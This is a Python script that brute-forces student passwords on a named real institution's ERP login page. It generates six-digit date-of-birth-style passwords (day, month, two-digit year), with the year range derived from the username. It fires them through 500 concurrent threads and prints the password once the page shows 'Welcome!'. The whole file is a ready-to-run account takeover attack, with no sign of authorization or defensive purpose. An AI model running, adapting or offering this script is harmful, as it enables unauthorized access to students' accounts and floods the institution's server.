import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://erp.nttftrg.com/nttf2/authenticate.do"

def send_request(username, password):
    data = {
        "operation": "studentLogin",
        "userName": username,
        "password": password
    }
    for _ in range(3):  # Retry mechanism
        try:
            r = requests.post(url, data=data, timeout=10)  # Set timeout
            soup = BeautifulSoup(r.text, 'html.parser')
            if "Welcome!" in soup.text:
                return f"Password of is: {password}"
            elif "login failed" in soup.text.lower() or "wrong detail" in soup.text.lower():
                return False
            else:
                return False
        except requests.exceptions.ConnectionError:
            print("Connection error, retrying...")
        except requests.exceptions.Timeout:
            print("Request timed out, retrying...")
    return "Failed to connect after multiple attempts."

def generate_passwords(username):
    user_indicator = int(username[6:8])
    if user_indicator == 24:
        last_digit_range = range(6, 9)
    elif user_indicator == 23:
        last_digit_range = range(5, 8)
    elif user_indicator == 22:
        last_digit_range = range(4, 7)
    elif user_indicator == 21:
        last_digit_range = range(3, 6)
    elif user_indicator == 20:
        last_digit_range = range(2, 5)
    else:
        last_digit_range = range(1, 4)

    for first_two in range(1, 32):
        for second_two in range(1, 13):
            for last_two in last_digit_range:
                yield f"{first_two:02d}{second_two:02d}{last_two:02d}"

def main():
    username = input("Enter username: ").strip()
    with ThreadPoolExecutor(max_workers=500) as executor:
        futures = [executor.submit(send_request, username, pwd) for pwd in generate_passwords(username)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)
                executor.shutdown(wait=False)
                return

if __name__ == '__main__':
    main()
